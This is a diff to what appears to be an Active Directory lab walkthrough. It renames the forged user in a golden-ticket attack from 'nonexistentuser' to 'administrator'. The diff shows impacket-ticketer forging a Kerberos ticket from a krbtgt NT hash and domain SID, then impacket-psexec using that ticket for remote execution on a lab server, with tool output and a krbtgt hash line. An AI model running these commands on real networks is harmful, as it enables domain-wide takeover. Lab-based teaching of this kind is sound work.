@@ -778,11 +778,11 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:09320ee4ca4f627b183bba1335d1c0c7:::
 
 ```console
 ┌──(root㉿kali)-[~]
-└─# impacket-ticketer -nthash 09320ee4ca4f627b183bba1335d1c0c7 -domain-sid S-1-5-21-2009310445-1600641453-2559099802 -domain lab.vx nonexistentuser
+└─# impacket-ticketer -nthash 09320ee4ca4f627b183bba1335d1c0c7 -domain-sid S-1-5-21-2009310445-1600641453-2559099802 -domain lab.vx administrator
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [*] Creating basic skeleton ticket and PAC Infos
-[*] Customizing ticket for lab.vx/nonexistentuser
+[*] Customizing ticket for lab.vx/administrator
 [*]     PAC_LOGON_INFO
 [*]     PAC_CLIENT_INFO_TYPE
 [*]     EncTicketPart
@@ -792,7 +792,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*]     PAC_PRIVSVR_CHECKSUM
 [*]     EncTicketPart
 [*]     EncASRepPart
-[*] Saving ticket in nonexistentuser.ccache
+[*] Saving ticket in administrator.ccache
 ```
 
 ### 5.1.4. Use the golden ticket to connect to **any** domain machine
@@ -801,10 +801,10 @@ The `-k` option of `impacket-psexec` means use Kerberos authentication; it grabs
 
 ```console
 ┌──(root㉿kali)-[~]
-└─# export KRB5CCNAME=nonexistentuser.ccache
+└─# export KRB5CCNAME=administrator.ccache
 
 ┌──(root㉿kali)-[~]
-└─# impacket-psexec lab.vx/nonexistentuser@svr.lab.vx -k -no-pass -target-ip 192.168.17.12 -dc-ip 192.168.17.11
+└─# impacket-psexec lab.vx/administrator@svr.lab.vx -k -no-pass -target-ip 192.168.17.12 -dc-ip 192.168.17.11
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [*] Requesting shares on 192.168.17.12.....
